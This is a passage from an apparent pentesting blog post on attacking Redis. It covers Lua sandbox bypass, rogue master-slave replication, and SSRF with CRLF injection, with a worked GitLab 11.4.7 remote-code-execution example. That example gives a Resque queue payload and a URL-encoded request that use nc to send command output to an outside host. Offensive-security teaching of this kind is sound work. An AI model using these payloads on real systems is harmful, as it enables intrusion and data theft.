</pre></table></code></div></div><h3 id="lua-sandbox-bypass"><span class="mr-2">LUA sandbox bypass</span><a href="#lua-sandbox-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Here</a> you can see that Redis uses the command EVAL to execute Lua code sandboxed. In the linked post you can see how to abuse it using the dotfile function, but <a href="https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval">apparently</a> this isn’t no longer possible. Anyway, if you can bypass the Lua sandbox you could execute arbitrary commas on the system. Also, from the same post you can see some options to cause DoS.</p><h3 id="master-slave-module"><span class="mr-2">Master-Slave Module</span><a href="#master-slave-module" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The master redis all operations are automatically synchronized to the slave redis, which means that we can regard the vulnerability redis as a slave redis, connected to the master redis which our own controlled, then we can enter the command to our own redis.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>master redis : 10.10.y.y <span class="c">#(Hacker's Server)</span>
slave  redis : 10.10.x.x <span class="c">#(Target Vulnerability Server)</span>

<span class="c">#A master-slave connection will be established from the slave redis and the master redis:</span>
redis-cli <span class="nt">-h</span> 10.1.0.52 <span class="nt">-p</span> 6379
slaveof 10.10.y.y 6379

<span class="c">#Then you can login to the master redis to control the slave redis:</span>
redis-cli <span class="nt">-h</span> 10.10.y.y <span class="nt">-p</span> 6379
<span class="nb">set </span>mykey hello
<span class="nb">set </span>mykey2 helloworld
</pre></table></code></div></div><h3 id="ssrf-talking-to-redis"><span class="mr-2">SSRF talking to Redis</span><a href="#ssrf-talking-to-redis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If you can send clear text request to Redis, you can communicate with it as Redis will read line by line the request and just respond with errors to the lines it doesn’t understand:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nt">-ERR</span> wrong number of arguments <span class="k">for</span> <span class="s1">'get'</span> <span class="nb">command</span>
<span class="nt">-ERR</span> unknown <span class="nb">command</span> <span class="s1">'Host:'</span>
<span class="nt">-ERR</span> unknown <span class="nb">command</span> <span class="s1">'Accept:'</span>
<span class="nt">-ERR</span> unknown <span class="nb">command</span> <span class="s1">'Accept-Encoding:'</span>
<span class="nt">-ERR</span> unknown <span class="nb">command</span> <span class="s1">'Via:'</span>
<span class="nt">-ERR</span> unknown <span class="nb">command</span> <span class="s1">'Cache-Control:'</span>
<span class="nt">-ERR</span> unknown <span class="nb">command</span> <span class="s1">'Connection:'</span>
</pre></table></code></div></div><p>Therefore, if you find a SSRF vuln in a website and you can control some headers (maybe with a CRLF vuln) or POST parameters, you will be able to send arbitrary commands to Redis.</p><h3 id="example-gitlab-ssrf--crlf-to-shell"><span class="mr-2">Example: Gitlab SSRF + CRLF to Shell</span><a href="#example-gitlab-ssrf--crlf-to-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In Gitlab11.4.7 were discovered a SSRF vulnerability and a CRLF. The SSRF vulnerability was in the import project from URL functionality when creating a new project and allowed to access arbitrary IPs in the form <code class="language-plaintext highlighter-rouge">0:0:0:0:0:ffff:127.0.0.1</code> (this will access 127.0.0.1), and the CRLF vuln was exploited just adding <code class="language-plaintext highlighter-rouge">%0D%0A</code> characters to the URL.</p><p>Therefore, it was possible to abuse these vulnerabilities to talk to the Redis instance that manages queues from gitlab and abuse those queues to obtain code execution. The Redis queue abuse payload is:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push <span class="s2">"{</span><span class="se">\"</span><span class="s2">class</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">GitlabShellWorker</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">args</span><span class="se">\"</span><span class="s2">:[</span><span class="se">\"</span><span class="s2">class_eval</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">open(</span><span class="se">\'</span><span class="s2">|whoami | nc 192.241.x.x 80</span><span class="se">\'</span><span class="s2">).read</span><span class="se">\"</span><span class="s2">],</span><span class="se">\"</span><span class="s2">retry</span><span class="se">\"</span><span class="s2">:3,</span><span class="se">\"</span><span class="s2">queue</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">system_hook_push</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">jid</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">ad52abc5641173e217eb2e52</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">created_at</span><span class="se">\"</span><span class="s2">:1513714403.8122594,</span><span class="se">\"</span><span class="s2">enqueued_at</span><span class="se">\"</span><span class="s2">:1513714403.8129568}"</span>
<span class="nb">exec</span>
</pre></table></code></div></div><p>And the URL encode request abusing SSRF and CRLF to execute a whoami and send back the output via nc is:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
<span class="c">#For some reason (as for the author of https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ where this info was took from) the exploitation worked with the git scheme and not with the http scheme.</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting-protocols/'>pentesting protocols</a>, <a href='/categories/redis/'>redis</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >pentesting</a> <a href="/tags/redis/" class="post-tag no-text-decoration" >redis</a> <a href="/tags/best-practicies/" class="post-tag no-text-decoration" >best practicies</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Redis+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&url=https%3A%2F%2Fsecybr.com%2Fposts%2Fredis-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Redis+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&u=https%3A%2F%2Fsecybr.com%2Fposts%2Fredis-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fsecybr.com%2Fposts%2Fredis-pentesting-best-practices%2F&text=Redis+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks." data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/subdomain-enumeration-methods/">Subdomain Enumeration Methods</a><li><a href="/posts/shodan-tutorials-for-best-practicies/">Shodan.io Tutorials for Best Practices</a><li><a href="/posts/collecting-target-email-address/">Collecting Target Email Addresses</a><li><a href="/posts/evasion-tactics-for-scanning-targets/">Evasion Tactics For Scanning Targets (Active Scan)</a><li><a href="/posts/dumping-lsass-without-mimikatz/">Dumping LSASS Without Mimikatz</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/ftp-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FTP Pentesting Best Practices</h3><div class="text-muted small"><p> FTP FTP usually uses port 21 What is FTP? FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protoco...</p></div></div></a></div><div class="card"> <a href="/posts/telnet-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Telnet Pentesting Best Practices</h3><div class="text-muted small"><p> Telnet Telnet usually uses port 23,992 What is Telnet? Telnet is a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication c...</p></div></div></a></div><div class="card"> <a href="/posts/finger-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654376400" data-df="ll" > Jun 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Finger Pentesting Best Practices</h3><div class="text-muted small"><p> Finger Finger usually uses port 79 What is Finger? Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly othe...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/smb-pentesting-best-practices/" class="btn btn-outline-primary" prompt="Older"><p>SMB Pentesting Best Practices</p></a> <a href="/posts/pop3-pentesting-best-practices/" class="btn btn-outline-primary" prompt="Newer"><p>POP3 Pentesting Best Practices</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://secybr.com/posts/redis-pentesting-best-practices/'; this.page.identifier = '/posts/redis-pentesting-best-practices/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://secybr-com.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><div class="row justify-content-center border-top"> <small class="my-4">Powered by <a href="https://twitter.com/0xhav0c" target="_blank" rel="noopener noreferrer">0xhav0c</a> © 2022 - <a href="/privacy-policy/">Privacy Policy</a> </small></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-XBEEHR73W1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-XBEEHR73W1'); }); </script>
